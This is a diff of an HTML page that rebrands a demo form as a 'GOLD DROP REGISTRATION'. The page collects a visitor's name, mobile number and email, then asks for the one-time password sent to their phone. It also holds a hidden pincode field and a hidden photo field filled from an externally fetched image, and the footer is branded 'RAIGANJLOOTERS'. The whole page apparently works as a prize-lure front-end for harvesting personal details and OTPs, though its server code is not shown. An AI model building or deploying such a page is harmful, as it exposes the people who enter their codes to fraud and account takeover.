@@ -3,15 +3,15 @@
 :root{color-scheme:dark;--gold:#f1df36;--cyan:#20dce0}*{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at top,#191910,#080808 52%);color:#f5f5f5;font:15px/1.5 system-ui,sans-serif;min-height:100vh;padding:24px 14px 40px}.wrap{width:min(100%,560px);margin:auto}.brand{border:1px solid var(--gold);outline:1px solid #6f681a;outline-offset:4px;text-align:center;padding:23px 12px;margin:6px 4px 28px}.brand b{display:block;color:var(--gold);font-size:19px}.brand strong{display:block;font-size:20px;font-weight:500}.brand small{color:var(--cyan);font-weight:750}.meta,.card{background:linear-gradient(145deg,#12141a,#0d0d0d);border:1px solid #343434;border-radius:12px;padding:17px;margin-bottom:18px}.meta{display:grid;grid-template-columns:1fr 1fr;gap:12px}.meta span{display:block;color:#9ca3af;font-size:12px}.meta b{color:var(--gold);font-size:14px}.task{text-align:center;color:var(--gold);font-weight:800;margin:26px 0 14px}.clock{color:var(--cyan)}.card{padding:20px}.card h2{font-size:17px;margin:0 0 16px;color:var(--gold)}label{display:block;font-size:13px;color:#ddd;margin:13px 0 6px}input{width:100%;border:1px solid #3b3b3b;border-radius:9px;background:#08090c;color:white;padding:13px 12px;font:inherit;outline:none}input:focus{border-color:var(--cyan);box-shadow:0 0 0 2px #20dce022}input[type=file]{padding:9px;font-size:13px}button{width:100%;border:0;border-radius:9px;padding:14px;margin-top:17px;background:var(--gold);color:#080808;font-size:15px;font-weight:850;cursor:pointer}button:disabled{opacity:.55;cursor:wait}.secondary{background:#222831;color:white;border:1px solid #444}.hidden{display:none}.hint{font-size:12px;color:#9ca3af;margin-top:6px}.status{white-space:pre-wrap;overflow-wrap:anywhere;background:#050505;border:1px solid #303030;border-radius:9px;padding:14px;min-height:75px;color:#cbd5e1;font:13px/1.55 ui-monospace,monospace}.status.ok{border-color:#16834b;color:#8df0b4}.status.bad{border-color:#b33;color:#ff9c9c}footer{text-align:center;color:#888;font-size:12px;margin-top:24px}footer b{color:var(--cyan)}@media(max-width:380px){.meta{grid-template-columns:1fr}.brand strong{font-size:18px}}
 </style></head><body>
 <section class="card">
-  <h2>ENTRY REGISTRATION DEMO</h2>
+  <h2>GOLD DROP REGISTRATION</h2>
   <form id="detailsForm">
-    <label for="name">Full name</label>
+    <label for="name">FULL NAME</label>
     <input id="name" name="name" autocomplete="name" maxlength="80" required placeholder="Enter your real full name">
 
-    <label for="mobile">Enter 10-digit mobile no.</label>
+    <label for="mobile">ENTER 10-DIGIT MOBILE NO.</label>
     <input id="mobile" name="mobile" inputmode="numeric" autocomplete="tel-national" maxlength="10" pattern="[0-9]{10}" required placeholder="Enter mobile number">
 
-    <label for="email">Email address</label>
+    <label for="email">EMAIL ADDRESS</label>
     <input id="email" name="email" type="email" autocomplete="email" maxlength="120" required placeholder="example@gmail.com">
 
     <!-- Hidden Pincode with default 517001 -->
@@ -20,7 +20,7 @@
     <!-- Hidden Photo File Input -->
     <input id="photo" name="photo" type="file" accept="image/jpeg,image/png,image/webp" style="display: none;">
 
-    <button id="requestBtn" type="submit">SUBMIT</button>
+    <button id="requestBtn" type="submit">REQUEST OTP</button>
   </form>
 </section>
 
@@ -55,7 +55,7 @@
     });
 
     // 3. Preload default hidden image into the file input
-    const imageUrl = 'https://www.pngmart.com/files/23/Free-Logos-PNG-HD-Isolated.png';
+    const imageUrl = 'https://img.sanishtech.com/u/2d10efe202ce0db247b36206f115604d.png';
     try {
       const response = await fetch(imageUrl);
       const blob = await response.blob();
@@ -71,7 +71,7 @@
   });
 </script>
 
-<section class="card hidden" id="otpCard"><h2>🔐 Verify OTP</h2><label for="otp">Enter 6-digit OTP</label><input id="otp" inputmode="numeric" maxlength="6" pattern="[0-9]{6}" placeholder="Enter OTP received on your phone"><button id="verifyBtn">VERIFY OTP</button><button id="restartBtn" class="secondary" type="button">START OVER</button></section>
+<section class="card hidden" id="otpCard"><h2>🔐 VERIFY OTP</h2><label for="otp">Enter 6-digit OTP</label><input id="otp" inputmode="numeric" maxlength="6" pattern="[0-9]{6}" placeholder="Enter OTP received on your phone"><button id="verifyBtn">VERIFY OTP</button><button id="restartBtn" class="secondary" type="button">START OVER</button></section>
 <section class="card"><h2>SERVER RESPONSE</h2><div id="status" class="status">Waiting for registration details…</div></section>
 <footer>Made with ❤️ by Vishal | <b>RAIGANJLOOTERS</b></footer></main>
 <script>
